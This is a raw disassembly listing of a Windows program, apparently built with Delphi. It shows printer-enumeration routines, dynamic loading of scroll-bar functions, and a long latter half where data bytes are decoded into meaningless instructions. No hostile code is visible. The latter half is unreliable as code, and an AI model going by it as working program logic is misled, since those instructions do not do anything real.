test eax eax
jge r-xdata
mov eax [ ebx + 0x28 ]
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x28 ] eax
sub_42bb80
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42bdaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edi ebx
xor edx edx
push ebp
push sub_42bd6c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov esi 0x2
mov bl 0x5
mov esi 0x6
mov bl 0x4
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_402744
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42bd5b
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
push eax
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
dec eax
test eax eax
jl r-xdata
call sub_403f38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bdb6
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_404450
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_402764
retn
inc eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
call sub_42b140
mov edi eax
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov edi [ esi ]
push edi
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b230
push eax
lea eax [ ebp - 0x20 ]
mov edx edi
call sub_40461c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
add [ ebp - 0x10 ] 0xc
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ esi ]
push eax
push edi
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b230
push eax
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_406660
mov eax [ ebp - 0x28 ]
mov edx [ esi ]
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x34 ] 0x6
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] 0x6
lea edx [ ebp - 0x38 ]
mov ecx 0x1
call sub_409730
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
lea eax [ ebp - 0x8 ]
call sub_42b140
mov edi eax
add [ ebp - 0x10 ] 0x14
cmp bl 0x4
jne r-xdata
sub_42bdc0
push ebp
mov ebp esp
add esp 0xfffffbdc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x424 ] edx
mov [ ebp - 0x420 ] edx
mov [ ebp - 0x41c ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42bf9d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x5
push 0x0
push 0x1
call EnumPrintersA
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40859c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42bf5d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x5
push 0x0
push 0x1
call EnumPrintersA
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
push 0x3ff
lea eax [ ebp - 0x418 ]
push eax
push r-xdata
push r-xdata
push r-xdata
call GetProfileStringA
lea eax [ ebp - 0x418 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
call sub_42b140
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
call GetLastError
cmp eax 0x7b
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_402764
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_42bb80
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
call sub_40d2f0
lea edx [ ebp - 0x41c ]
mov eax [ rw-data ]
call sub_406660
mov eax [ ebp - 0x41c ]
call sub_42b174
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_4048dc
push eax
push 0x0
mov eax [ ebx + 0x4 ]
call sub_4048dc
push eax
mov eax [ ebx + 0x8 ]
call sub_4048dc
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_42b8b4
call sub_403f38
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x420 ]
mov edx [ ebp - 0x14 ]
call sub_40461c
mov edx [ ebp - 0x420 ]
pop eax
call sub_408838
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bfa4
lea eax [ ebp - 0x424 ]
mov edx 0x3
call sub_404450
retn
sub_42bfc0
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x10 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea eax [ esi + 0x10 ]
call sub_40dabc
inc eax
mov ebx eax
xor edi edi
mov edx edi
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_4036c0
inc edi
dec ebx
jne r-xdata
sub_42c028
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c059
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c060
retn
mov eax [ rw-data ]
call sub_4036c0
sub_42c06c
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42c0a0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42c0c8
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42c34a
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c371
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c378
retn
sub_42c38c
fadd st3
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
les eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffffba0042c4 ]
les eax [ edx ]
adc [ edx ] al
add [ eax ] al
cwde
loopne r-xdata
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax + edx + 0x43 ] bh
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] dh
inc esp
add [ edi + ecx * 4 + 0x58600044 ] bl
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
je r-xdata
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
jne r-xdata
sbb al 0x39
insd
inc edi
jb r-xdata
add dh bh
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push [ eax ]
inc edx
outsd
js r-xdata
add [ esi + esi + 0x40 ] dh
add [ eax ] dh
inc esp
add [ edi + ecx * 4 + 0x58600044 ] bl
inc esp
cwde
pushad
inc esp
jne r-xdata
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x28 ] 0x10
inc ebx
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ ecx + edx ] dh
inc ebx
add [ esi + edx * 2 + 0x550c0044 ] ah
inc esp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ eax - 0x7eabffbc ] al
inc esp
add [ esp + eax * 4 ] al
inc esp
add [ ecx + edx + 0x43 ] al
add [ ecx ] cl
push esp
inc edi
jb r-xdata
rcr [ esi + eax * 8 ] 0x42
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] edx
outsd
jne r-xdata
add [ eax + 0x36 ] bl
inc eax
inc edx
outsd
js r-xdata
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa465646f
inc edx
outsd
js r-xdata
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x28 ] 0x10
inc ebx
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ ecx + edx ] dh
inc ebx
add [ esi + edx * 2 + 0x550c0044 ] ah
inc esp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ eax - 0x7eabffbc ] al
inc esp
add [ esp + eax * 4 ] al
inc esp
add [ ecx + edx + 0x43 ] al
add [ eax + eax ] al
push es
mov al 0x12
mov al 0x10
mov al 0x5
add [ eax + 0x13 ] dl
inc ebx
add al dl
adc eax [ ebx ]
in al 0x13
inc ebx
add [ eax ] al
adc al 0x43
add [ edi ] cl
push esp
inc ebx
jne r-xdata
rcl al 0xc4
inc edx
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add [ eax ] al
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
lds eax [ edx ]
int3
add [ edx + ebp * 2 + 0x3e3c0041 ] al
outsd
insd
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
or eax [ ebx + 0x6f ]
js r-xdata
jne r-xdata
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
jb r-xdata
add [ eax - 0x80000000 ] al
push cs
add [ edi ] al
inc ebx
popad
jo r-xdata
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax + edx + 0x43 ] bh
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc ecx
add [ esi + edi ] bh
inc edx
outsd
js r-xdata
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3b00ffff ] ah
test [ eax + eax - 0x18 ] eax
test [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
push eax
mov [ ebx ] 0x7a
add [ eax ] al
imul ebp [ edi + 0x6e ] sub_41f844
jo r-xdata
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
retn
[ eax + 0x1e ]
jae r-xdata
sbb al 0xcc
inc ebx
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
xor eax [ eax + eax + 0x10 ]
inc eax
add [ eax - 0x3b00ffff ] ch
jo r-xdata
add bh bh
add al 0x1f
inc esp
add [ eax ] ah
pop ds
inc esp
add [ eax ] al
add [ eax ] al
add [ 0xf800000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
outsd
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc esp
add [ eax + 0x1e ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040017 ] al
outsd
outsb
je r-xdata
add bh bh
pop eax
push ds
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
[ ebx + 0x1ff0000 ]
int3
movsb [ edi ] gs : [ esi ]
outsb
jae r-xdata
int 0x43
add [ eax + eax ] dh
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
add [ ecx ] 0x0
add [ eax ] al
push ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
in al 0xfc
inc ecx
add [ eax ] ch
int3
sub_42cd88
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
jne r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 8 + 0x42 ] ah
add [ eax + 0x40000001 ] cl
int3
push 0x41
add [ eax ] al
pop ss
je r-xdata
inc ebx
add ah ah
sbb [ ebx ] al
mov al [ 0x4c004411 ]
add [ edx + ebp * 2 + 0x17000041 ] al
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
mov esp cs
inc edx
add [ eax + 0x43 ] ch
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
sbb eax [ eax + eax + 0x2c ]
jmp 0xffffffffe656ce33
in al 0x18
inc ebx
add [ eax + 0x4c004411 ] ah
inc ebx
je r-xdata
out 0x41 al
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ esp + edx ] dl
inc ebx
add [ eax ] al
sub eax 0x2cfc0044
inc esp
add ah cl
sub eax 0x10a80044
inc esp
add ah ch
pop ss
inc esp
add [ eax + 0x17 ] dl
inc esp
add [ eax + 0x20 ] bh
inc esp
add al dh
cmove eax [ eax ]
hlt
insb
jae r-xdata
add [ eax + r-xdata ] dl
sub_42d1f1
mov esp 0x1004318
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
js r-xdata
into
jo r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941d285
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
xor al 0x41
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
inc esp
outsd
arpl [ ebx + 0x58 ] bp
rol [ ebx ] 0x1
adc [ ecx ] al
add bh bh
push ebp
jo r-xdata
inc ebp
outsb
inc esp
jb r-xdata
sub [ eax ] eax
or [ edi + 0x6e ] ecx
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
je r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
iretd
add al bl
aad 0x42
jb r-xdata
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
xor al 0x41
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
xor [ ecx ] 0x0
jb r-xdata
fmul st6
inc ebx
add al bl
add [ eax ] al
add [ eax ] al
js r-xdata
and [ edx ] al
add [ eax ] al
test al 0xdb
inc ebx
add [ ecx + ebp * 8 ] dl
inc esp
jb r-xdata
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jb r-xdata
inc ebp
outsb
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
xor al 0x41
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
add [ eax + 0x4f0b002b ] al
add [ eax ] al
dec edi
jbe r-xdata
cwde
push eax
outsd
jo r-xdata
and [ edx ] al
add [ eax ] al
aam 0x42
outsd
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ eax ] ah
add al [ eax ]
add [ eax + 0x140043db ] ch
jmp 0x3956d4d7
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
aad 0x42
add dh al
aad 0x42
sbb al 0xd4
inc edx
add [ ebx ] al
or eax 0x69644554
je r-xdata
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
push 0x41
add [ esi + edi ] bh
jb r-xdata
mov eax eax
mov al 0xd4
inc edx
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x68 ] bp
rol [ ebx ] 0x1
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
jo r-xdata
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ eax ] dh
pop ds
inc ebx
add ah ch
pop ds
inc ebx
add [ eax + 0x43 ] bl
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax ] al
and [ ebx ] eax
cwde
test [ eax + eax + 0x4 ] al
arpl [ eax + eax + 0x54 ] ax
add [ eax + eax + 0x4 ] 0xd4004484
sbb al [ ebx ]
adc [ 0x1ccc0043 ] bl
inc ebx
add [ esi + ebx + 0x1d400043 ] dl
inc ebx
add al dh
sbb al 0x43
add [ ebp + ebx + 0x1df80043 ] ah
inc ebx
add [ 0x69644554 ] al
je r-xdata
rcr [ eax - 0x29 ] 0x42
add [ edi ] al
add eax 0x69644554
je r-xdata
add [ ecx + edi ] bl
inc eax
add [ edx ] ah
inc ebx
add [ eax + 0x36 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x63ffbbbd ] bh
outsd
insd
inc ebp
imul esi [ fs : eax + esi * 4 - 0x2c ] 0xdf500042
inc ebx
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x61437261
jae r-xdata
loop r-xdata
popad
jae r-xdata
arpl [ gs : esi + 0x6f ] cx
jb r-xdata
dec esp
popad
jbe r-xdata
sub [ ecx ] al
rol [ ebx ] 0x1
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
xor al 0x41
add [ eax ] ch
add [ eax ] eax
[ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
salc
inc edx
add ah dl
aad 0x42
add [ ecx ] al
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
pop [ eax + eax + 0x60 ]
pop eax
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ edx + ebx ] ch
inc ebx
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add ah dh
sbb al [ ebx ]
insb
adc [ eax + eax - 0x40 ] eax
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
pushfd
insb
jae r-xdata
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
adc al 0xe9
add [ eax ] eax
add [ eax ] al
add [ edx ] al
inc ebx
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add ah dh
sbb al [ ebx ]
insb
adc [ eax + eax - 0x40 ] eax
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ eax ] dh
pop ds
inc ebx
add ah ch
pop ds
inc ebx
add [ eax + 0x43 ] bl
